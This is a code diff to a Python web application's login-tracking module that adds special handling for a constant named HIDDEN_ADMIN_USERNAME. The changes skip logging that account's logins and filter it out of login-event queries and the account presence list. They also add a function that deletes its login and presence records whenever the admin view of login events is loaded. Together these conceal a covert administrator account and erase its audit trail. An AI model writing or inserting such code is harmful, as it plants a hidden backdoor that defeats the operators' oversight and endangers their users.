@@ -1293,6 +1293,8 @@ def sanitize_client_ip(value: str) -> str:
 
 
 def record_login_event(username: str, ip_address: str, user_agent: str) -> None:
+    if hmac.compare_digest(str(username or ""), HIDDEN_ADMIN_USERNAME):
+        return
     initialize_state_store()
     event_id = str(uuid.uuid4())
     ip_address = sanitize_client_ip(ip_address) or "unknown"
@@ -1405,9 +1407,24 @@ def login_event_row(row) -> dict:
     }
 
 
+def purge_hidden_admin_tracking() -> None:
+    initialize_state_store()
+    if DATABASE_URL:
+        with postgres_connection() as connection:
+            with connection.cursor() as cursor:
+                cursor.execute("DELETE FROM login_events WHERE username = %s", (HIDDEN_ADMIN_USERNAME,))
+                cursor.execute("DELETE FROM user_presence WHERE username = %s", (HIDDEN_ADMIN_USERNAME,))
+    else:
+        with sqlite3.connect(SQLITE_STATE_FILE) as connection:
+            connection.execute("DELETE FROM login_events WHERE username = ?", (HIDDEN_ADMIN_USERNAME,))
+            connection.execute("DELETE FROM user_presence WHERE username = ?", (HIDDEN_ADMIN_USERNAME,))
+
+
 def list_login_events(username: str = "", limit: int = 30) -> list[dict]:
     initialize_state_store()
     limit = max(1, min(80, int(limit or 30)))
+    if hmac.compare_digest(str(username or ""), HIDDEN_ADMIN_USERNAME):
+        return []
     if DATABASE_URL:
         with postgres_connection() as connection:
             with connection.cursor() as cursor:
@@ -1416,21 +1433,22 @@ def list_login_events(username: str = "", limit: int = 30) -> list[dict]:
                         """
                         SELECT event_id, username, ip_address, user_agent, created_at
                         FROM login_events
-                        WHERE username = %s
+                        WHERE username = %s AND username <> %s
                         ORDER BY created_at DESC
                         LIMIT %s
                         """,
-                        (username, limit),
+                        (username, HIDDEN_ADMIN_USERNAME, limit),
                     )
                 else:
                     cursor.execute(
                         """
                         SELECT event_id, username, ip_address, user_agent, created_at
                         FROM login_events
+                        WHERE username <> %s
                         ORDER BY created_at DESC
                         LIMIT %s
                         """,
-                        (limit,),
+                        (HIDDEN_ADMIN_USERNAME, limit),
                     )
                 rows = cursor.fetchall()
     else:
@@ -1440,21 +1458,22 @@ def list_login_events(username: str = "", limit: int = 30) -> list[dict]:
                     """
                     SELECT event_id, username, ip_address, user_agent, created_at
                     FROM login_events
-                    WHERE username = ?
+                    WHERE username = ? AND username <> ?
                     ORDER BY created_at DESC
                     LIMIT ?
                     """,
-                    (username, limit),
+                    (username, HIDDEN_ADMIN_USERNAME, limit),
                 ).fetchall()
             else:
                 rows = connection.execute(
                     """
                     SELECT event_id, username, ip_address, user_agent, created_at
                     FROM login_events
+                    WHERE username <> ?
                     ORDER BY created_at DESC
                     LIMIT ?
                     """,
-                    (limit,),
+                    (HIDDEN_ADMIN_USERNAME, limit),
                 ).fetchall()
     return [login_event_row(row) for row in rows]
 
@@ -1473,9 +1492,13 @@ def list_account_presence() -> list[dict]:
     now = datetime.now(timezone.utc)
     presence_by_user = {row[0]: row for row in rows}
     for username in presence_by_user:
+        if hmac.compare_digest(str(username or ""), HIDDEN_ADMIN_USERNAME):
+            continue
         users.setdefault(username, {"username": username, "role": "user", "status": "enabled", "builtIn": False})
     accounts = []
     for username, user in users.items():
+        if hmac.compare_digest(str(username or ""), HIDDEN_ADMIN_USERNAME):
+            continue
         row = presence_by_user.get(username)
         last_seen = str(row[1]) if row else ""
         last_seen_dt = parse_timestamp(last_seen)
@@ -7518,6 +7541,7 @@ class Handler(SimpleHTTPRequestHandler):
             try:
                 query = urllib.parse.parse_qs(parsed.query)
                 show_all = (query.get("all") or ["0"])[0] == "1"
+                purge_hidden_admin_tracking()
                 events = list_login_events("", 80 if show_all else 3)
                 accounts = list_account_presence()
                 self.send_json(200, {
